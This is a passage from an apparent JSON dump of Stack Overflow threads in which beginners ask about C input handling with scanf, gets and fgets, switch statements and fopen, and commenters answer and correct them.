"https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1545815147, "post_id": 53929678, "comment_id": 94700283, "body": "But if I add {} after the If statement wrapping the switch statement I get an error with the else function :( , why is that?"}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 1, "creation_date": 1545815179, "post_id": 53929678, "comment_id": 94700290, "body": "out of your problem, why do you refuse to divide 0 by something != 0 ? you do not have to test if value1 is 0 or not, just to check value2"}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 1, "creation_date": 1545820983, "post_id": 53929678, "comment_id": 94702399, "body": "You need to change <code>||</code> to <code>&amp;&amp;</code>.  Right now you&#39;re entering the <code>switch</code> if <i>either</i> operand is valid.  But what you want is to only enter the <code>switch</code> if <i>both</i> operands are valid."}], "answers": [{"comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1545815816, "post_id": 53929844, "comment_id": 94700520, "body": "Never, ever suggest <code>gets()</code> on SO.  <a href=\"https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used\">The <code>gets()</code> function is far too dangerous to be used \u2014 ever!</a>  It is better to use <code>fgets()</code> and <code>sscanf()</code> to read a line and then parse it."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1545816028, "post_id": 53929844, "comment_id": 94700587, "body": "Although the <code>if</code> statement is wrong, as long as at least one of <code>value1</code> and <code>value2</code> is in the range <code>0 .. 9</code>, it doesn&#39;t matter if the other is outside the range; the test will pass.  The <code>||</code> should be an <code>&amp;&amp;</code> if both numbers should be in the range <code>0 .. 9</code>."}], "tags": [], "owner": {"reputation": 25, "user_id": 8884853, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/61W6g.png?s=128&g=1", "display_name": "Zsombor", "link": "https://stackoverflow.com/users/8884853/zsombor"}, "is_accepted": false, "score": 0, "last_activity_date": 1545816174, "last_edit_date": 1545816174, "creation_date": 1545815432, "answer_id": 53929844, "question_id": 53929678, "link": "https://stackoverflow.com/questions/53929678/wrap-a-switch-statement-inside-an-if-statement-c/53929844#53929844", "title": "Wrap a switch statement inside an if statement C?", "body": "<p>The only problem in your code, besides your indentation and not wrapping some things inside <code>{ }</code>s (although it should work this way too), is that you are reading in your numbers incorrectly.</p>\n\n<ol>\n<li>In the <code>if( (value1&gt;=0 &amp;&amp; value1&lt;=9) || (value2&gt;=0 &amp;&amp; value2&lt;=9) )</code>, you are checking only for values between 0 and 9. If you enter 10, it's not going to work. I see that you were trying to check for characters, like '0' or '9', but then you need another function to process what you've just read in.\n<br><strong>EDIT</strong>: I didn't notice at first, but your if has <code>||</code> instead of <code>&amp;&amp;</code>. Right now, the test will pass even if only one of your numbers is valid.</li>\n<li>You read in with a <code>scanf(\"%f\", ...)</code>. Let's say I enter a <code>K</code> there. The computer will try to process it like it was a floating point number.</li>\n</ol>\n\n<p>I would suggest using a <code>fgets</code> and then processing it with another function, character by character, building up your numbers.\nIf anyone knows a better way, feel free to comment.\nI hope this helps.</p>\n"}, {"tags": [], "owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "is_accepted": false, "score": 2, "last_activity_date": 1545816596, "last_edit_date": 1545816596, "creation_date": 1545815949, "answer_id": 53929944, "question_id": 53929678, "link": "https://stackoverflow.com/questions/53929678/wrap-a-switch-statement-inside-an-if-statement-c/53929944#53929944", "title": "Wrap a switch statement inside an if statement C?", "body": "<p>as it was already said when you enter <code>20 ? 2</code> because you have <code>if( (value1&gt;=0 &amp;&amp; value1&lt;=9) || (value2&gt;=0 &amp;&amp; value2&lt;=9) )</code> the error will concern the value rather than the operator. This test of the values must be removed.</p>\n\n<p>you just have to check the result of <em>scanf</em></p>\n\n<ul>\n<li><p>if it 0 the first entered value is not a valid float</p></li>\n<li><p>if it is 1 only a valid float was entered, it is not followed by a space then the operator</p></li>\n<li><p>it if is 2 only a valid float then a space then the operator was entered, after the operator there is not a space then a valid float</p></li>\n<li><p>it if is 3 you know value1 and value2 are valid values and the operator was entered, you can do your switch to test operator and compute the result</p></li>\n</ul>\n"}, {"comments": [{"owner": {"reputation": 3350, "user_id": 7332147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/e4GFL.png?s=128&g=1", "display_name": "linuxfan says Reinstate Monica", "link": "https://stackoverflow.com/users/7332147/linuxfan-says-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1545822152, "post_id": 53930612, "comment_id": 94702801, "body": "Nice work, but &quot;if(value1==0 || value2==0)&quot; is wrong. It is an error only if value2==0."}, {"owner": {"reputation": 87, "user_id": 10834294, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-x3dwTZhrE1I/AAAAAAAAAAI/AAAAAAAAAVY/YKApPbNRyIU/photo.jpg?sz=128", "display_name": "Alejandro Rosales", "link": "https://stackoverflow.com/users/10834294/alejandro-rosales"}, "edited": false, "score": 0, "creation_date": 1545983751, "post_id": 53930612, "comment_id": 94748692, "body": "Thank you for your help, this worked! I think I needed to understand more about the scanf function in order to solve this problem!"}, {"owner": {"reputation": 139, "user_id": 9682036, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Helping Bean", "link": "https://stackoverflow.com/users/9682036/helping-bean"}, "reply_to_user": {"reputation": 87, "user_id": 10834294, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-x3dwTZhrE1I/AAAAAAAAAAI/AAAAAAAAAVY/YKApPbNRyIU/photo.jpg?sz=128", "display_name": "Alejandro Rosales", "link": "https://stackoverflow.com/users/10834294/alejandro-rosales"}, "edited": false, "score": 0, "creation_date": 1546791170, "post_id": 53930612, "comment_id": 94959821, "body": "@alejandro Rosales make this an answer if you are satisfied with it.so that it makes it an green mark."}], "tags": [], "owner": {"reputation": 139, "user_id": 9682036, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Helping Bean", "link": "https://stackoverflow.com/users/9682036/helping-bean"}, "is_accepted": true, "score": 0, "last_activity_date": 1545823269, "last_edit_date": 1545823269, "creation_date": 1545819367, "answer_id": 53930612, "question_id": 53929678, "link": "https://stackoverflow.com/questions/53929678/wrap-a-switch-statement-inside-an-if-statement-c/53930612#53930612", "title": "Wrap a switch statement inside an if statement C?", "body": "<p>To make it simple I have changed float to integer type.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main (void)\n{\nint value1, value2;\nchar Operator;\n\nprintf(\"Enter your two values expression (x (+, -, *, /) y): \");\nif (scanf(\"%d %c %d\", &amp;value1, &amp;Operator, &amp;value2) != 3)\n{\n  printf(\"Either of value1 or value2 is not a number. Enter valid input\\n\");\n  return EXIT_FAILURE;\n}\nswitch(Operator)\n{\n    case '+':\n        printf(\"The result is: %d \\n\", value1+value2);\n        break;\n\n    case '-':\n        printf(\"The result is: %d \\n\", value1-value2);\n        break;\n\n    case '*':\n    case 'x':\n    case 'X':\n        printf(\"The result of this multiplication is: %d \\n\", value1*value2);\n\n    break;\n\n    case '/':\n\n        if(value2==0)\n        {\n        printf(\"you can't divide by 0, Hence value2 must be an non zero integer\\n\");\n        }\n        else\n            printf(\"The result of this division is: %d \\n\", value1/value2);\n        break;\n\n    default:\n        printf(\"Error please enter a valid operator \\n\");\n        break;\n\n}\nreturn;\n}\n</code></pre>\n"}], "owner": {"reputation": 87, "user_id": 10834294, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-x3dwTZhrE1I/AAAAAAAAAAI/AAAAAAAAAVY/YKApPbNRyIU/photo.jpg?sz=128", "display_name": "Alejandro Rosales", "link": "https://stackoverflow.com/users/10834294/alejandro-rosales"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 248, "favorite_count": 0, "accepted_answer_id": 53930612, "answer_count": 3, "score": 1, "last_activity_date": 1545823269, "creation_date": 1545814499, "question_id": 53929678, "link": "https://stackoverflow.com/questions/53929678/wrap-a-switch-statement-inside-an-if-statement-c", "title": "Wrap a switch statement inside an if statement C?", "body": "<p>So I want my program to do an arithmetic calculation between 2 values:</p>\n\n<p>1.first, I want my program to check if the 2 values entered are numbers <br>\n2.If that's correct I wan't it to run a switch statement that depending on the operator will do the calculation <br>\n3.If the operator entered is not a valid one(*, +, -, /) then I wan't an error returned saying that the operator is not valid <br>\n4.If the values are not numbers I wan't to display that the values entered are not valid <br></p>\n\n<p>for example if I enter K * 2 I want the program to say \"Error invalid value\" <br>\nIf I enter 20 ? 2 the program should return \"Error valid operator\"</p>\n\n<p>I have tried using {} and () to wrap the switch function but nothing seems to work</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main (void)\n{\n float value1, value2;\n char Operator;\n\n printf(\"Enter your two values expression (x (+, -, *, /) y): \");\n scanf(\"%f %c %f\", &amp;value1, &amp;Operator, &amp;value2);\n\n\nif( (value1&gt;=0 &amp;&amp; value1&lt;=9) || (value2&gt;=0 &amp;&amp; value2&lt;=9) )\n\nswitch(Operator)\n{\n    case '+':\n\n        printf(\"The result is: %.2f \\n\", value1+value2);\n\n    break;\n\n    case '-':\n\n        printf(\"The result is: %.2f \\n\", value1-value2);\n\n        break;\n\n    case '*':\n    case 'x':\n    case 'X':\n\n        printf(\"The result of this multiplication is: %.2f \\n\", \n value1*value2);\n\n    break;\n\n    case '/':\n\n        if(value1==0 || value2==0)\n        printf(\"Error 1 you can't divide by 0 \\n\");\n        else\n        printf(\"The result of this division is: %.2f \\n\", value1/value2);\n    break;\n\n    default:\n        printf(\"Error please enter a valid operator \\n\");\n        break;\n\n}\n\nelse printf(\"Error please enter a valid value \\n\");\n\n\n\n}\n</code></pre>\n\n<p>When I enter an invalid value the program returns \"Error please enter a valid operator\" instead of the else statement \"Error please enter a valid value\"</p>\n\n<p>Also if the first value is correct but the second is not, let's say:\n10*c\nInstead of returning \"Error please enter a valid value\" it returns 0.</p>\n"}, {"tags": ["c", "arrays", "for-loop"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1545813628, "post_id": 53929505, "comment_id": 94699850, "body": "First of all, never <b><i>ever</i></b> use <code>gets</code>. <a href=\"https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used\">It&#39;s a dangerous function</a>, and has therefore been removed from the C specification. Use e.g. <a href=\"https://en.cppreference.com/w/c/io/fgets\" rel=\"nofollow noreferrer\"><code>fgets</code></a> instead."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 3, "creation_date": 1545813693, "post_id": 53929505, "comment_id": 94699872, "body": "As for your problem, there are probably quite a few duplicates here on stackoverflow.com, but in short the problem is the <code>Enter</code> key you press for the input of the number. It&#39;s added to the input buffer as a newline, a newline that the <code>scanf</code> <i>doesn&#39;t</i> remove."}], "answers": [{"tags": [], "owner": {"reputation": 19, "user_id": 10045787, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4556b80fd705859dd5a825ff1a0b52c7?s=128&d=identicon&r=PG&f=1", "display_name": "Rajeesh Rarankurissi", "link": "https://stackoverflow.com/users/10045787/rajeesh-rarankurissi"}, "is_accepted": false, "score": 0, "last_activity_date": 1545818063, "creation_date": 1545818063, "answer_id": 53930346, "question_id": 53929505, "link": "https://stackoverflow.com/questions/53929505/program-making-blank-output-file-c/53930346#53930346", "title": "Program making blank output file, C", "body": "<p>Please try to modify your for loop as below. It will help you to get the expected output</p>\n\n<pre><code>for (int i = 1; i &lt;n ; i++) \n{\n  reverseWords(s[i]);\n  printf(\"The number %d Sentence  %s\\n\", i, s[i]);\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 9095, "user_id": 8542346, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11b206b49cec657d28a5876f8330780e?s=128&d=identicon&r=PG&f=1", "display_name": "H.S.", "link": "https://stackoverflow.com/users/8542346/h-s"}, "is_accepted": false, "score": 0, "last_activity_date": 1545819150, "creation_date": 1545819150, "answer_id": 53930555, "question_id": 53929505, "link": "https://stackoverflow.com/questions/53929505/program-making-blank-output-file-c/53930555#53930555", "title": "Program making blank output file, C", "body": "<p>First of all <a href=\"https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used\">don't use gets()</a>. Instead, use <a href=\"https://en.cppreference.com/w/c/io/fgets\" rel=\"nofollow noreferrer\">fgets()</a>.</p>\n\n<p>The problem is occurring because of the newline character remains on the input stream. When you give number of strings input, you enter number and hit the <code>ENTER</code> key. So, the input stream has <code>3\\n</code> in it <em>[<code>3</code> is number of strings input]</em>. The <code>scanf()</code> will read the <code>3</code>, but not the newline following it. That newline character will remain on the input stream. As soon as the <code>gets()</code> called, it read that newline character. The <code>gets()</code> reads until a newline character or the end-of-file is reached and if newline character found, it read but does not copy it to buffer and appends a terminating null character to the buffer. Hence, you are getting the first string as empty string.</p>\n\n<p>A quick fix of your problem is to call <code>getchar()</code> immediately after the <code>scanf()</code> which will consume the stray newline character. But this is also not the perfect solution. You should not mix up the <code>scanf()</code> and <code>gets()</code> or other input functions. May you can consider using <code>fgets()</code> consistently in your program. For number of strings input you can use <code>strtol()</code> or <code>sscanf()</code> to convert the string to number.</p>\n\n<p>NOTE: If you use <code>fgets()</code>, remember that it consider newline character as a valid character and include it in the string copied to buffer passed. Make sure to remove trailing newline character. Check <a href=\"https://stackoverflow.com/questions/2693776/removing-trailing-newline-character-from-fgets-input\">this</a>.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user9754500"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 427, "favorite_count": 0, "closed_date": 1545819601, "answer_count": 2, "score": 0, "last_activity_date": 1545828600, "creation_date": 1545813444, "last_edit_date": 1545828600, "question_id": 53929505, "link": "https://stackoverflow.com/questions/53929505/program-making-blank-output-file-c", "closed_reason": "Duplicate", "title": "Program making blank output file, C", "body": "<p>I have a small program which reverses the words when inputted however for some reason the first input is being outputted as a blank without allowing the user to enter any input for it. This is happening for any amount of n, and I have been playing around with the for loops (were I think the error is) however I have not yet managed to eliminate the problem.</p>\n\n<p>Thanks In Advance and Happy Holidays!</p>\n\n<p><strong>CODE:</strong></p>\n\n<pre><code>int main()\n{\n    int n;\n\n    printf(\"How many strings would you like to insert?\\n\");\n    scanf(\"%d\",&amp;n);\n    n=n+1;\n    char s[n][100];\n\n\n    printf(\"Insert %d strings\\n\", n-1);\n\n    for(int i=0; i&lt;n; i++) {\n        gets(s[i]);\n    }\n\n    for (int i = 0; i &lt;n ; i++) {\n        reverseWords(s[i]);\n        printf(\"The number %d Sentence is %s\\n\", i+1, s[i]);\n    }\n\n    return 0;\n} \n</code></pre>\n\n<p><strong>Input/Output:</strong></p>\n\n<pre><code>How many strings would you like to insert?\n3\n\nInsert 3 strings\nhello whats up\nbye dude\n\nThe number 1 Sentence is\nThe number 2 Sentence is up whats hello\nThe number 3 Sentence is dude bye\n\nProcess finished with exit code 0\n</code></pre>\n\n<p><strong>EDIT:</strong></p>\n\n<p>I managed to find a fix myself. Thoughts on this fix?</p>\n\n<pre><code>int main()\n{\n    int n;\n\n    printf(\"How many strings would you like to insert?\\n\");\n    scanf(\"%d\",&amp;n);\n    char s[n][100];\n\n    printf(\"Insert %d strings\\n\", n);\n\n    for(int i=0; i&lt;n+1; i++) {\n        gets(s[i]);\n    }\n\n    for (int i = 1; i &lt;n+1 ; i++) {\n        reverseWords(s[i]);\n        printf(\"The number %d sentence in reverse is %s\\n\", i, s[i]);\n    }\n\n    return 0;\n} \n</code></pre>\n\n<p><strong>New Output:</strong>\n\"G:\\UoM\\Second Year\\Programming Principles in C\\Question 1\\cmake-build-debug\\CLion.exe\"\nHow many strings would you like to insert?\n3</p>\n\n<pre><code>Insert 3 strings\nHello Carl whats up?\nDude Whats giong on?\nwow nice!\n\nThe number 1 sentence is up? whats Carl Hello\nThe number 2 sentence is on? giong Whats Dude\nThe number 3 sentence is nice! wow\n</code></pre>\n"}, {"tags": ["c", "structure"], "comments": [{"owner": {"reputation": 11619, "user_id": 5346306, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BsACH.jpg?s=128&g=1", "display_name": "Achal", "link": "https://stackoverflow.com/users/5346306/achal"}, "edited": false, "score": 3, "creation_date": 1545813118, "post_id": 53929413, "comment_id": 94699709, "body": "<code>scanf(&quot;%d&quot;,user1.age);</code> --&gt; <code>scanf(&quot;%d&quot;,&amp;user1.age);</code> compiler should have warned you. Don&#39;t ignore compiler warning."}, {"owner": {"reputation": 173, "user_id": 9613780, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/De6o7.jpg?s=128&g=1", "display_name": "Mahamad A. Kanout&#233;", "link": "https://stackoverflow.com/users/9613780/mahamad-a-kanout%c3%a9"}, "edited": false, "score": 0, "creation_date": 1545813253, "post_id": 53929413, "comment_id": 94699738, "body": "why do the strings do not need that &quot;&amp;&quot; ?"}, {"owner": {"reputation": 11619, "user_id": 5346306, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BsACH.jpg?s=128&g=1", "display_name": "Achal", "link": "https://stackoverflow.com/users/5346306/achal"}, "edited": false, "score": 1, "creation_date": 1545813908, "post_id": 53929413, "comment_id": 94699937, "body": "@Mahamad In <code>C</code> there is no string, it&#39;s a character array and array name itself address that&#39;s the reason you don&#39;t have to provide <code>&amp;</code>."}], "answers": [{"tags": [], "owner": {"reputation": 751, "user_id": 5552166, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8941926688c6212b73aa67cbb2c70428?s=128&d=identicon&r=PG&f=1", "display_name": "hessam hedieh", "link": "https://stackoverflow.com/users/5552166/hessam-hedieh"}, "is_accepted": true, "score": 2, "last_activity_date": 1545813235, "creation_date": 1545813235, "answer_id": 53929481, "question_id": 53929413, "link": "https://stackoverflow.com/questions/53929413/bug-right-after-entering-all-the-data/53929481#53929481", "title": "Bug right after entering all the data.", "body": "<p>For scanf to fill the value correctly the address of that value has to be passed to the function, in case of your example, all names are arrays so when you pass their name, you are passing the pointer, but age field is not an array, so you should pass the address with &amp; operator, so just change to this. </p>\n\n<pre><code>scanf(\"%d\", &amp;user1.age)\n</code></pre>\n"}], "owner": {"reputation": 173, "user_id": 9613780, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/De6o7.jpg?s=128&g=1", "display_name": "Mahamad A. Kanout&#233;", "link": "https://stackoverflow.com/users/9613780/mahamad-a-kanout%c3%a9"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 38, "favorite_count": 0, "accepted_answer_id": 53929481, "answer_count": 1, "score": 0, "last_activity_date": 1545813235, "creation_date": 1545812844, "question_id": 53929413, "link": "https://stackoverflow.com/questions/53929413/bug-right-after-entering-all-the-data", "title": "Bug right after entering all the data.", "body": "<p>I'm writing a little program in C to record a person last name, given name, and age. I'm trying to use structures to do it \nAs soon as I add the age it bugs.</p>\n\n<p>I've tried to use fscanf fgets etc.. but no luck</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;printf.h&gt;\n#include \"personne.h\"\n\n\nint main() {\n\n\n    Pers user1;\n\n    printf(\"What's your given name ?\");\n    scanf(\"%s\",user1.givenname);\n    printf(\"What's your last name ?\");\n    scanf(\"%s\",user1.lastname);\n    printf(\"What's your age ?\");\n    scanf(\"%d\",user1.age);\n\n    printf(\"Your name is %s %s and you're %d years old\",user1.givenname,user1.lastname,user1.age);\n\n\n    return 0;\n}\n\n\n======================================================================\n</code></pre>\n\n<p>Here's my header file</p>\n\n<pre><code>#ifndef TABLEAU_DE_TYPEPERSONNE_PERSONNE_H\n#define TABLEAU_DE_TYPEPERSONNE_PERSONNE_H\n\n#endif //TABLEAU_DE_TYPEPERSONNE_PERSONNE_H\n\n\ntypedef struct Personne Pers;\n\nstruct Personne{\n    int age;\n    char lastname[100];\n    char givenname[100];\n    char address[1000];\n\n\n};\n</code></pre>\n\n<p>normally at the end, it should print the infos. </p>\n"}, {"tags": ["c", "file"], "comments": [{"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1545812000, "post_id": 53929114, "comment_id": 94699399, "body": "On <code>fopen</code> failure, use <code>perror</code> (or <code>errno</code>) to understand the reason of the failure"}, {"owner": {"reputation": 3350, "user_id": 7332147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/e4GFL.png?s=128&g=1", "display_name": "linuxfan says Reinstate Monica", "link": "https://stackoverflow.com/users/7332147/linuxfan-says-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1545813023, "post_id": 53929114, "comment_id": 94699688, "body": "Use scanf(), because reading char by char involves much more work - you also have to manage those <code>0x</code> and spaces."}, {"owner": {"reputation": 1, "user_id": 11725888, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/56c847185baf7f902f56a715dd0825c0?s=128&d=identicon&r=PG", "display_name": "Dinesh Datla", "link": "https://stackoverflow.com/users/11725888/dinesh-datla"}, "edited": false, "score": 0, "creation_date": 1562007696, "post_id": 53929114, "comment_id": 100234681, "body": "Have you checked to see if your build folder is clean, i.e., the file that you are trying to open is not located in the build folder."}], "answers": [{"comments": [{"owner": {"reputation": 35932, "user_id": 1606345, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IwiIM.png?s=128&g=1", "display_name": "David Ranieri", "link": "https://stackoverflow.com/users/1606345/david-ranieri"}, "reply_to_user": {"reputation": 2356, "user_id": 2966337, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b530afb5e73055843ece98a2dab90585?s=128&d=identicon&r=PG&f=1", "display_name": "Craig.Feied", "link": "https://stackoverflow.com/users/2966337/craig-feied"}, "edited": false, "score": 0, "creation_date": 1545812830, "post_id": 53929166, "comment_id": 94699648, "body": "@Craig.Feied,  I don&#39;t know if is an answer, because, as far as I understand the <code>while</code> loop is reached in his code (<code>fopen</code> was successful: <i>while loop, it prints &quot;FF&quot; indefinitely</i>)"}, {"owner": {"reputation": 2356, "user_id": 2966337, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b530afb5e73055843ece98a2dab90585?s=128&d=identicon&r=PG&f=1", "display_name": "Craig.Feied", "link": "https://stackoverflow.com/users/2966337/craig-feied"}, "edited": false, "score": 0, "creation_date": 1545812899, "post_id": 53929166, "comment_id": 94699656, "body": "But that was exactly his question: how can the <code>while</code> loop be reached if the file does not exist? It should be impossible, and it is impossible on my system."}, {"owner": {"reputation": 35932, "user_id": 1606345, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IwiIM.png?s=128&g=1", "display_name": "David Ranieri", "link": "https://stackoverflow.com/users/1606345/david-ranieri"}, "reply_to_user": {"reputation": 2356, "user_id": 2966337, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b530afb5e73055843ece98a2dab90585?s=128&d=identicon&r=PG&f=1", "display_name": "Craig.Feied", "link": "https://stackoverflow.com/users/2966337/craig-feied"}, "edited": false, "score": 0, "creation_date": 1545813169, "post_id": 53929166, "comment_id": 94699721, "body": "Yes, that sounds very odd ... maybe the file remains on cache even when deleted or  using a wrong path or not showing the real code ..."}], "tags": [], "owner": {"reputation": 35932, "user_id": 1606345, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IwiIM.png?s=128&g=1", "display_name": "David Ranieri", "link": "https://stackoverflow.com/users/1606345/david-ranieri"}, "is_accepted": false, "score": 1, "last_activity_date": 1545811868, "last_edit_date": 1545811868, "creation_date": 1545811220, "answer_id": 53929166, "question_id": 53929114, "link": "https://stackoverflow.com/questions/53929114/fopen-returns-non-null-pointer-even-though-file-does-not-exist/53929166#53929166", "title": "fopen returns non-null pointer even though file does not exist", "body": "<p>Use an <code>int</code> instead of a <code>char</code> for <code>ch</code></p>\n\n<p>1) Because <code>fgetc</code> returns an <code>int</code></p>\n\n<blockquote>\n  <p>The C library function int fgetc(FILE *stream) gets the next character\n  (an unsigned char) from the specified stream and advances the position\n  indicator for the stream.</p>\n</blockquote>\n\n<p>2) Because <code>EOF</code> can be defined as some number not representable by <code>char</code></p>\n\n<p>Same for <code>boot_rom_golden</code></p>\n"}, {"tags": [], "owner": {"reputation": 2356, "user_id": 2966337, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b530afb5e73055843ece98a2dab90585?s=128&d=identicon&r=PG&f=1", "display_name": "Craig.Feied", "link": "https://stackoverflow.com/users/2966337/craig-feied"}, "is_accepted": false, "score": 0, "last_activity_date": 1545812645, "creation_date": 1545812645, "answer_id": 53929375, "question_id": 53929114, "link": "https://stackoverflow.com/questions/53929114/fopen-returns-non-null-pointer-even-though-file-does-not-exist/53929375#53929375", "title": "fopen returns non-null pointer even though file does not exist", "body": "<p>When I compile and run your code on my system it behaves as you would expect: <code>myFile</code> becomes a null pointer and the null test causes an early exit. On your machine, <code>myFile == NULL</code> is not true, and the early exit does not occur.</p>\n\n<p>I deduce that either the code you are actually executing is not the same as the code you posted, or there is something going on in your environment that is different from mine. </p>\n\n<p>Can you trace through this line by line? </p>\n\n<p>Are you certain that the file named does not exist on your system at the moment this is being executed?</p>\n\n<p>Perhaps there is truncation occurring? Try a short path and short filename.</p>\n\n<p>Try an absolute filepath rather than a relative one.</p>\n\n<p>Null is likely a macro -- perhaps it's not what you think? Try <code>if(myFile)</code> as an alternate.</p>\n\n<p>If not resolved, post more info about your system, and tell us what <code>myFile</code> is when your system does not think it's equal to NULL.</p>\n"}], "owner": {"reputation": 793, "user_id": 3565150, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/3b6d7de9652d4f46423efe1308d3ebaf?s=128&d=identicon&r=PG&f=1", "display_name": "user3565150", "link": "https://stackoverflow.com/users/3565150/user3565150"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 490, "favorite_count": 0, "answer_count": 2, "score": -2, "last_activity_date": 1562007696, "creation_date": 1545810883, "last_edit_date": 1545820113, "question_id": 53929114, "link": "https://stackoverflow.com/questions/53929114/fopen-returns-non-null-pointer-even-though-file-does-not-exist", "title": "fopen returns non-null pointer even though file does not exist", "body": "<p>I have a Hex file whose contents are like below:</p>\n\n<p>0x14000800\n0x52100000\n0xD503201F\n0xD503201F\n0x0030A308\n0x0032D138\n0x00000000\n0x00000000\n0x00000000\n0x00000000</p>\n\n<p>I need to open and read this file. Below is my code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(void)\n{\n char ch, boot_rom_golden[16];\n FILE *myFile = NULL;\n\n myFile = fopen(\"/prj/vlsi/tests/boot_rom_fail/src/apps_proc0/sm6140_rom.a52100000_ROM_FULL.hex\", \"r\");\n\n if (myFile == NULL) {\n    printf(\"Error Reading File\\n\");\n    exit(0);\n  }\n\nwhile ((ch = fgetc(myFile)) != EOF) {\nprintf(\"%x \\n\", ch);\n}\n</code></pre>\n\n<p>I have two questions:</p>\n\n<ol>\n<li><p>My understanding is if the file does not exist in the above mentioned path, then fopen should return a NULL. Observation is : even if the file does not exist in the above path (/prj/vlsi/....) , fopen is returning some value and then it goes to while loop trying to print the content. Why is this happening? My main.c and the hex file are residing in the same path. But still I tried giving the complete path which also gave the same results (i.e. even if file does not exist it is returning a non zero pointer value)</p></li>\n<li><p>When the code executes while loop, it prints \"FF\" indefinitely. It should be because of reason stated above. </p></li>\n</ol>\n\n<p>Please help to know the issue and how to debug these kind of issues ?</p>\n"}, {"tags": ["c", "exploit", "format-string"], "comments": [{"owner": {"reputation": 424, "user_id": 3721542, "user_type": "registered", "profile_image": 